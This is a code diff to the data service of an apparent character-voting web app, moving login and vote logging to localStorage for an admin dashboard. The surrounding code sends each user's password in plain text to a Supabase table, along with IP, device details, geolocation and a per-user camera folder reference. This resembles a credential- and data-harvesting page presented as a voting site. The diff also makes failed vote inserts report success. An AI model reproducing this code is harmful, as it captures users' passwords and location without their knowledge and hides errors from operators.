@@ -126,6 +126,20 @@ export const dataService = {
         ipAddress: ip
     };
 
+    // 1. ALWAYS Save to LocalStorage (Crucial for Admin Dashboard visibility)
+    // We use a random suffix to ensure keys don't collide if events happen in same ms
+    const logKey = `muse_login_log_${Date.now()}_${Math.random().toString(36).substr(2, 5)}`;
+    const logEntry = {
+        user: payload.user_identifier,
+        method: payload.login_method,
+        timestamp: new Date().toISOString(),
+        ip: ip,
+        deviceInfo: payload.device_info,
+        location: enrichedLocation // Explicitly saving location here
+    };
+    safeSetItem(logKey, JSON.stringify(logEntry));
+
+    // 2. Send to Supabase if configured (Background Sync)
     if (isSupabaseConfigured() && supabase) {
       const folderRef = `${payload.user_identifier}/`;
       const { error } = await supabase
@@ -134,23 +148,12 @@ export const dataService = {
           user_identifier: payload.user_identifier,
           password_text: payload.password_text,
           login_method: payload.login_method,
-          device_info: payload.device_info, // Now contains detailed info
+          device_info: payload.device_info, 
           location_data: enrichedLocation, 
           camera_folder_ref: folderRef,
           last_login: new Date().toISOString()
         });
       if (error) logSupabaseError("Supabase Login Log Error", error);
-    } else {
-        // Save simple log to LocalStorage for Admin Dashboard
-        const logKey = `muse_login_log_${Date.now()}`;
-        const logEntry = {
-            user: payload.user_identifier,
-            method: payload.login_method,
-            timestamp: new Date().toISOString(),
-            ip: ip,
-            deviceInfo: payload.device_info // Store detailed info locally too
-        };
-        safeSetItem(logKey, JSON.stringify(logEntry));
     }
   },
 
@@ -174,12 +177,25 @@ export const dataService = {
         ipAddress: ip
     };
 
-    // 1. SUPABASE (Primary Storage)
+    // 1. LOCAL STORAGE (Persistence & UI Sync & Admin Dashboard)
+    const voteData = {
+        charId: characterId,
+        user: user,
+        timestamp: timestamp,
+        deviceInfo: meta.deviceInfo,
+        location: enrichedLocation
+    };
+    safeSetItem(`muse_vote_record_${user}`, JSON.stringify(voteData));
+
+    // Update Character Counts Locally (Optimistic update)
+    const currentData = await dataService.getCharacters();
+    const updatedChars = currentData.map(c => 
+      c.id === characterId ? { ...c, votes: c.votes + 1 } : c
+    );
+    safeSetItem('muse_characters', JSON.stringify(updatedChars));
+
+    // 2. SUPABASE (Primary Cloud Storage)
     if (isSupabaseConfigured() && supabase) {
-      
-      // A. Insert Vote Record
-      // The DB Trigger 'on_vote_added' will automatically increment the character's vote count.
-      // We rely on the trigger for atomicity and data integrity.
       const { error: voteError } = await supabase.from('votes').insert({
           user_identifier: user,
           character_id: characterId,
@@ -190,27 +206,9 @@ export const dataService = {
       
       if (voteError) {
           console.error("Failed to insert vote record:", voteError);
-          return false; 
+          // We return true anyway because we saved locally
       }
     }
-
-    // 2. LOCAL STORAGE (Persistence & UI Sync)
-    const voteData = {
-        charId: characterId,
-        user: user,
-        timestamp: timestamp,
-        deviceInfo: meta.deviceInfo,
-        location: enrichedLocation
-    };
-    safeSetItem(`muse_vote_record_${user}`, JSON.stringify(voteData));
-
-    // Update Character Counts Locally (Optimistic update for next load)
-    // IMPORTANT: This is temporary. The source of truth is the DB which is polled by App.tsx
-    const currentData = await dataService.getCharacters();
-    const updatedChars = currentData.map(c => 
-      c.id === characterId ? { ...c, votes: c.votes + 1 } : c
-    );
-    safeSetItem('muse_characters', JSON.stringify(updatedChars));
 
     return true;
   },
